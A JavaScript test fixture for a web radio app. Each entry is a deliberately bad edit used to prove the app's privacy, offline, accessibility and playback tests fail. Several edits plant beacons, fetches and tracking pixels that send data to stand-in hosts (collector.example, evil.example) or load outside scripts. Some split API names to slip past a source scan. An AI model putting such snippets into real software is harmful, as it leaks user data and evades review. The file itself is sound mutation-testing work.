/**
 * Breakers: one known-bad change per way a promise check could be fooled.
 * tests/promises.test.mjs applies each to a throwaway copy of the repo and
 * runs its check, which must FAIL. A check nobody has seen fail doesn't
 * count.
 *
 * Each breaker: `check` (the test file it must make fail), `name`,
 * `file`, and either an exact `find` (must occur once) swapped for
 * `replace`, or `edits`, a list of such pairs for a break that takes more
 * than one change. A new
 * hole found by a red-team pass becomes a new entry here.
 */
export const BREAKERS = [
  // ── Nothing leaves the device ──────────────────────────────────────────
  {
    check: 'tests/promise-no-egress.test.mjs',
    name: 'a beacon to an outside host at startup',
    file: 'RadioGridXL.html',
    find: '  showFeedbackCard();\n  showHapticsAvailability();',
    replace: "  showFeedbackCard();\n  navigator.sendBeacon('https://collector.example/c', 'boot');\n  showHapticsAvailability();",
  },
  {
    check: 'tests/promise-no-egress.test.mjs',
    name: 'a fetch reporting which station played',
    file: 'RadioGridXL.html',
    find: 'function playStream(id) {',
    replace: "function playStream(id) {\n  fetch('https://evil.example/played?id=' + encodeURIComponent(id)).catch(function() {});",
  },
  {
    check: 'tests/promise-no-egress.test.mjs',
    name: 'a tracking pixel loaded as an image',
    file: 'RadioGridXL.html',
    find: '  showFeedbackCard();\n  showHapticsAvailability();',
    replace: "  showFeedbackCard();\n  new Image().src = 'https://px.example/p.gif';\n  showHapticsAvailability();",
  },
  {
    check: 'tests/promise-no-egress.test.mjs',
    name: 'the hosted CSP widened to another host',
    file: 'hosted-build.mjs',
    find: `"connect-src 'self' https://*.api.radio-browser.info"`,
    replace: `"connect-src 'self' https://*.api.radio-browser.info https://collector.example"`,
  },
  {
    check: 'tests/promise-no-egress.test.mjs',
    // Radio Browser's docs ask apps to report each play; that tells the
    // directory what this radio listens to.
    name: 'telling Radio Browser which station was added',
    file: 'RadioGridXL.html',
    find: 'function closeStreamBrowser() {',
    replace: "function closeStreamBrowser() {\n  fetch('https://de1.api.radio-browser.info/json/url/u1').catch(function() {});",
  },
  {
    check: 'tests/promise-no-egress.test.mjs',
    name: 'details riding along in a stream address',
    file: 'RadioGridXL.html',
    find: '  liveSource = false; // until this source says otherwise (noteLiveness)\n  audio.src = s.url;',
    replace: "  liveSource = false; // until this source says otherwise (noteLiveness)\n  audio.src = s.url + (s.url.includes('?') ? '&' : '?') + 'org=' + encodeURIComponent(cfg.orgName);",
  },
  {
    check: 'tests/promise-no-egress.test.mjs',
    name: 'a pixel when the PIN pad opens',
    file: 'RadioGridXL.html',
    find: 'function showPinOverlay() {',
    replace: "function showPinOverlay() {\n  new Image().src = 'https://px.example/pin.gif';",
  },
  {
    check: 'tests/promise-no-egress.test.mjs',
    name: 'the service worker reporting each page load',
    file: 'sw.js',
    find: "self.addEventListener('fetch', (event) => {",
    replace: "self.addEventListener('fetch', (event) => {\n  if (event.request.mode === 'navigate') fetch('https://collector.example/sw').catch(() => {});",
  },

  // ── Paused or stopped audio never restarts on its own ──────────────────
  {
    check: 'tests/playback.test.mjs',
    name: 'Wi-Fi coming back resumes a paused station',
    file: 'RadioGridXL.html',
    find: '  else hideOverlay(nonetOverlay); // paused from the lock screen meanwhile: just clear it',
    replace: '  else { hideOverlay(nonetOverlay); if (playing) retryStream(); }',
  },
  {
    check: 'tests/playback.test.mjs',
    // The app guards this three times (the error listener, connectionLost
    // and the retry timer), so the regression is all three going.
    name: 'an error while paused schedules a retry',
    file: 'RadioGridXL.html',
    edits: [
      { find: 'function connectionLost() {\n  if (!playing || paused) return;', replace: 'function connectionLost() {\n  if (!playing) return;' },
      { find: "  // and resumeActive() reloads because of the fault noted above.\n  if (paused) return;\n", replace: "  // and resumeActive() reloads because of the fault noted above.\n" },
      { find: '    retryTimer = null;\n    if (!playing || paused) return;\n    reloadActive();', replace: '    retryTimer = null;\n    if (!playing) return;\n    reloadActive();' },
    ],
  },
  {
    check: 'tests/playback.test.mjs',
    name: 'Apply reloads the paused station when its address changed',
    file: 'RadioGridXL.html',
    find: '    if (before && before.url !== s.url) failedStreams.delete(s.id);',
    replace: '    if (before && before.url !== s.url) failedStreams.delete(s.id);\n    if (before && before.url !== s.url && s.id === playing) reloadActive();',
  },
  {
    check: 'tests/playback.test.mjs',
    name: 'restoring a backup carries the paused station on',
    file: 'RadioGridXL.html',
    find: '  // Stop playback before swapping streams out from under it.\n  stopPlayback();',
    replace: '  // Keep the station going across the restore.\n  if (playing) setTimeout(reloadActive, 0);',
  },
  {
    check: 'tests/playback.test.mjs',
    name: 'Reset carries the paused station on',
    file: 'RadioGridXL.html',
    find: '  // Stop any playback\n  stopPlayback();',
    replace: '  if (playing) setTimeout(reloadActive, 0);',
  },

  // ── With Reduce Motion on, nothing moves ───────────────────────────────
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    name: 'a transition that outranks the reduce block',
    file: 'RadioGridXL.html',
    find: '  #preview-back.nudge { animation: none; }\n}',
    replace: '  #preview-back.nudge { animation: none; }\n}\n#settings-panel { transition-duration: 300ms !important; }',
  },
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    name: 'a script animation that ignores Reduce Motion',
    file: 'RadioGridXL.html',
    find: 'function closeSettings() {',
    replace: "function closeSettings() {\n  document.getElementById('app').animate([{ opacity: 0.5 }, { opacity: 1 }], 2000);",
  },
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    // Red-team 2026-11-07: short enough to end before the first look, so
    // only the element.animate recorder sees it.
    name: 'a short script fade on closing settings',
    file: 'RadioGridXL.html',
    find: 'function closeSettings() {',
    replace: "function closeSettings() {\n  document.getElementById('app').animate([{ opacity: 0.6 }, { opacity: 1 }], 150);",
  },
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    name: 'an animation in the station browser',
    file: 'RadioGridXL.html',
    find: 'function openStreamBrowser() {',
    replace: "function openStreamBrowser() {\n  document.getElementById('stream-browser-overlay').animate([{ transform: 'scale(0.95)' }, { transform: 'none' }], 2000);",
  },
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    // No animation API reports this: a script stepping a transform each frame.
    name: 'a scrolling name marquee driven by requestAnimationFrame',
    file: 'RadioGridXL.html',
    find: 'function showPinOverlay() {',
    replace: "function showPinOverlay() {\n  (function step(t) { document.getElementById('pin-overlay-title').style.transform = 'translateX(' + Math.round(t / 20 % 40) + 'px)'; requestAnimationFrame(step); })(0);",
  },
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    name: 'smooth scrolling left on under Reduce Motion',
    file: 'RadioGridXL.html',
    find: '  #preview-back.nudge { animation: none; }\n}',
    replace: '  #preview-back.nudge { animation: none; }\n}\nhtml { scroll-behavior: smooth; }',
  },
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    // Red-team 2026-11-14, with the wait for shortened transitions: each
    // repeat is under MAX_MS, but 80,000 of them flicker for 800ms.
    name: 'a script flicker of many tiny repeats',
    file: 'RadioGridXL.html',
    find: 'function closeSettings() {',
    replace: "function closeSettings() {\n  document.getElementById('app').animate([{ opacity: 0.2 }, { opacity: 1 }], { duration: 0.01, iterations: 80000 });",
  },
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    // The same in CSS, outranking the reduce block's single iteration.
    name: 'a CSS pulse of many tiny repeats',
    file: 'RadioGridXL.html',
    find: '  #preview-back.nudge { animation: none; }\n}',
    replace: '  #preview-back.nudge { animation: none; }\n}\n#settings-panel.open { animation: pulse 0.01ms 80000 !important; }',
  },
  {
    check: 'tests/promise-reduced-motion.test.mjs',
    // The reduce block shortens durations, not delays: a jump 300ms late.
    name: 'a delayed jump the reduce block leaves in place',
    file: 'RadioGridXL.html',
    find: '  #preview-back.nudge { animation: none; }\n}',
    replace: '  #preview-back.nudge { animation: none; }\n}\n.overlay { transition-delay: 300ms !important; }',
  },

  // ── Works with no internet: no outside script, style or font ───────────
  {
    check: 'smoke-test.mjs',
    name: 'an outside script',
    file: 'RadioGridXL.html',
    find: '</head>',
    replace: '<script src="https://cdn.example/lib.js"></script>\n</head>',
  },
  {
    check: 'smoke-test.mjs',
    name: 'an outside stylesheet',
    file: 'RadioGridXL.html',
    find: '</head>',
    replace: '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">\n</head>',
  },
  {
    check: 'smoke-test.mjs',
    name: 'an outside font in the CSS',
    file: 'RadioGridXL.html',
    find: '@media (prefers-reduced-motion: reduce) {',
    replace: "@font-face { font-family: 'Far'; src: url('https://fonts.gstatic.com/s/far.woff2'); }\n@media (prefers-reduced-motion: reduce) {",
  },
  {
    check: 'smoke-test.mjs',
    name: 'a module pulled in with import()',
    file: 'RadioGridXL.html',
    find: 'function openStreamBrowser() {',
    replace: "function openStreamBrowser() {\n  import('https://esm.sh/confetti').catch(function() {});",
  },
  {
    check: 'smoke-test.mjs',
    name: 'a script element added at run time',
    file: 'RadioGridXL.html',
    find: 'function showPinOverlay() {',
    replace: "function showPinOverlay() {\n  var lib = document.createElement('script'); lib.src = 'https://cdn.example/x.js'; document.head.appendChild(lib);",
  },
  {
    check: 'smoke-test.mjs',
    name: 'the service worker importing an outside script',
    file: 'sw.js',
    find: "self.addEventListener('fetch', (event) => {",
    replace: "importScripts('https://cdn.example/sw-lib.js');\nself.addEventListener('fetch', (event) => {",
  },

  // ── Text meets WCAG AA in every theme, 7:1 in High Contrast ────────────
  {
    check: 'tests/contrast.test.mjs',
    name: 'a station colour too light for white text',
    file: 'RadioGridXL.html',
    find: "{ id: 'blue',   dark: { bg: '#1a3d6e'",
    replace: "{ id: 'blue',   dark: { bg: '#8fb8ff'",
  },
  {
    check: 'tests/contrast.test.mjs',
    name: 'a High Contrast token that passes AA but not 7:1',
    file: 'RadioGridXL.html',
    find: 'html.theme-contrast-dark {\n  --accent: #ffff00;\n  --on-accent: #000000;\n  --btn-mark: #ffff00;\n  --btn-failed-bg: #000000;\n  --btn-failed-text: #a6a6a6;\n  --accent-text: #ffff00;\n  --danger: #ff9999;\n\n  --header-bg: #000000;\n  --header-text: #ffffff;',
    replace: 'html.theme-contrast-dark {\n  --accent: #ffff00;\n  --on-accent: #000000;\n  --btn-mark: #ffff00;\n  --btn-failed-bg: #000000;\n  --btn-failed-text: #a6a6a6;\n  --accent-text: #ffff00;\n  --danger: #ff9999;\n\n  --header-bg: #000000;\n  --header-text: #8a8a8a;',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: 'X-Large station descriptions faded',
    file: 'RadioGridXL.html',
    find: 'html[data-size="xlarge"] .btn-sublabel { font-size: var(--btn-sub-size, 24px); }',
    replace: 'html[data-size="xlarge"] .btn-sublabel { font-size: var(--btn-sub-size, 24px); opacity: 0.45; }',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: 'station text faded on a short landscape screen (inside @media)',
    file: 'RadioGridXL.html',
    find: '  #pin-overlay .overlay-body { font-size: 14px; }',
    replace: '  #pin-overlay .overlay-body { font-size: 14px; }\n  .btn-label, .btn-sublabel { opacity: 0.4; }',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: 'dialog body text greyed',
    file: 'RadioGridXL.html',
    find: '  font-weight: 600;\n  color: var(--overlay-sub);\n  line-height: 1.5;\n  max-width: 460px;',
    replace: '  font-weight: 600;\n  color: #808080;\n  line-height: 1.5;\n  max-width: 460px;',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: 'the Stop label back under 4.5:1 in Dark',
    file: 'RadioGridXL.html',
    find: '  --stop-idle-text: #7a7aad; /* 4.6:1 on the transport bar (#111122) */',
    replace: '  --stop-idle-text: #7777aa;',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: 'below-the-fold settings text losing its colour (the feedback addresses, 1.09:1 in Dark)',
    file: 'RadioGridXL.html',
    find: '  font-weight: 700;\n  color: var(--settings-text);\n  overflow-wrap: anywhere;',
    replace: '  font-weight: 700;\n  color: #000000;\n  overflow-wrap: anywhere;',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: 'placeholders back to a pale grey (text that is not a text node)',
    file: 'RadioGridXL.html',
    find: '::placeholder { color: var(--settings-label); opacity: 1; }',
    replace: '::placeholder { color: #8a8a8a; opacity: 1; }',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: "a dropdown's chosen option greyed (the country and region pickers)",
    file: 'RadioGridXL.html',
    find: '.stream-browser-filters select {\n  flex: 1;\n  min-width: 0;\n  padding: 6px 8px;\n  border-radius: 6px;\n  border: 1px solid var(--settings-border);\n  background: var(--settings-input-bg);\n  color: var(--settings-text);',
    replace: '.stream-browser-filters select {\n  flex: 1;\n  min-width: 0;\n  padding: 6px 8px;\n  border-radius: 6px;\n  border: 1px solid var(--settings-border);\n  background: var(--settings-input-bg);\n  color: #8a8a8a;',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: "station names greyed in a shelf's rows (only drawn once a shelf opens)",
    file: 'RadioGridXL.html',
    find: '.sb-result-name {\n  font-size: 13px;\n  font-weight: 700;\n  color: var(--settings-text);',
    replace: '.sb-result-name {\n  font-size: 13px;\n  font-weight: 700;\n  color: #8a8a8a;',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: "the guide's title greyed",
    file: 'RadioGridXL.html',
    find: '#help-title {\n  font-size: 15px;\n  font-weight: 700;\n  color: var(--settings-text);',
    replace: '#help-title {\n  font-size: 15px;\n  font-weight: 700;\n  color: #8a8a8a;',
  },
  {
    check: 'tests/contrast.test.mjs',
    name: "the guide's offline message greyed (only shown with no connection)",
    file: 'RadioGridXL.html',
    find: '  text-align: center;\n  color: var(--settings-text);\n  font-size: 14px;',
    replace: '  text-align: center;\n  color: #8a8a8a;\n  font-size: 14px;',
  },

  // ── Never opens a website, another app or a new window ─────────────────
  {
    check: 'tests/promise-stays-radio.test.mjs',
    name: 'the feedback address made a link again',
    file: 'RadioGridXL.html',
    find: '<div class="feedback-address" id="feedback-page-address">radio.<wbr>marshworks.dev/<wbr>feedback</div>',
    replace: '<a class="feedback-address" id="feedback-page-address" href="https://radio.marshworks.dev/feedback/">radio.<wbr>marshworks.dev/<wbr>feedback</a>',
  },
  {
    check: 'tests/promise-stays-radio.test.mjs',
    name: 'an email link that opens the mail app',
    file: 'RadioGridXL.html',
    find: '<div class="feedback-address" id="feedback-mail-address">radio@<wbr>marshworks.dev</div>',
    replace: '<a class="feedback-address" id="feedback-mail-address" href="mai' + 'lto:radio@marshworks.dev">radio@<wbr>marshworks.dev</a>',
  },
  {
    check: 'tests/promise-stays-radio.test.mjs',
    // Spelled so no source pattern matches: only the Chromium run can see it.
    name: 'a button that opens a window, spelled to dodge the source scan',
    file: 'RadioGridXL.html',
    find: 'function showSleepOverlay() {',
    replace: "function showSleepOverlay() {\n  window['op' + 'en']('https://sleep-sounds.example/', '_blank');",
  },
  {
    check: 'tests/promise-stays-radio.test.mjs',
    name: 'Cancel sending the page to a help site',
    file: 'RadioGridXL.html',
    find: 'function cancelReset() {',
    replace: "function cancelReset() {\n  setTimeout(function() { window['loc' + 'ation'].href = 'https://help.example/'; }, 0);",
  },
];
